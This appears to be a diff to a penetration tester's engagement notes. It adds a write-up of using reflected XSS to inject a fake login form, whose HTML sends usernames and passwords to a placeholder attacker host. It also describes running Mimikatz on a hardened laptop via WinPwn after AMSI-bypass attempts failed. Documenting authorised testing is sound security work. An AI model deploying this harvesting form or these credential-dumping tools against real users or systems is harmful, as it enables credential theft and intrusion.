@@ -8,6 +8,22 @@ Injected a login form to demonstrate weaponization and sent the test creds to my
 SMB anonymous access had tools and scripts with user community access, could have been used as a supply chain attack.<br>
 
 
+  
+
+### XSS → Credential Harvesting Demo
+
+On a recent engagement I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.
+
+\```html
+<form action="https://attacker-controlled.example/collect" method="POST">
+  <input type="text" name="username" placeholder="Username" required>
+  <input type="password" name="password" placeholder="Password" required>
+  <button type="submit">Sign In</button>
+</form>
+\```
+
+
+
 
 <b>Mimikatz on Hardened Endpoint</b>
 <br>On a recent test I was able to run Mimikatz on a hardened laptop via the WinPwn tool.  I ran into blocks attempting to run Mimiktaz using AMSI-bypass techniques including many from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell which is not very surprising these days.  However WinPwn; https://github.com/S3cur3Th1sSh1t/WinPwn ran which contains many enumeration and exploit tools.  Since Mimikatz is loaded in an indirect way the endpoint allowed it to run. <br>
